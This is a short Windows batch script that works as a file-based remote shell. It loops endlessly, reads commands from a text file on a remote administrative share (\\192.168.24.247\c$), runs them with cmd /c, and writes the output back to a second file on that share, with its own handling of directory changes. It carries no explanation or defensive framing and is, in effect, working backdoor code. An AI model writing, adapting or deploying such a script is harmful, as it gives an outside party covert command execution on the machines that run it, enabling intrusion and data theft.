@echo off
setlocal enabledelayedexpansion


set "PCNAME=%COMPUTERNAME%"
set "FILE_A=\\192.168.24.247\c$\Users\NativT\Documents\%PCNAME%A.txt"
set "FILE_B=\\192.168.24.247\c$\Users\NativT\Documents\%PCNAME%B.txt"
set "CURR_DIR=%cd%"


:loop
if not exist "%FILE_A%" (
    timeout /t 1 /nobreak >nul
    goto loop
)
set /p cmd=<"%FILE_A%"

echo %cmd% | findstr /i "^cd" >nul
if not errorlevel 1 (
    set "arg=!cmd:~3!"
    if "!arg!"=="" (
        > "%FILE_B%" echo Current directory: !CURR_DIR!
	del "%FILE_A%"
        goto loop
    )

    if "!arg!"==".." (
        for %%i in ("!CURR_DIR!\..") do set "CURR_DIR=%%~fi"
        > "%FILE_B%" echo Changed directory to !CURR_DIR!
	del "%FILE_A%"
        goto loop
    )

    if exist "!arg!\" (
        for %%i in ("!arg!") do set "CURR_DIR=%%~fi"
        > "%FILE_B%" echo Changed directory to !CURR_DIR!
	del "%FILE_A%"
    ) else (
        > "%FILE_B%" echo Directory not found: !arg!
	del "%FILE_A%"
    )
    goto loop
)

if /i "!cmd!"=="exit" (
    del "%FILE_A%"
    goto loop
)

pushd "!CURR_DIR!"
cmd /c "!cmd!" > "%FILE_B%" 2>&1
del "%FILE_A%"
goto loop
:end
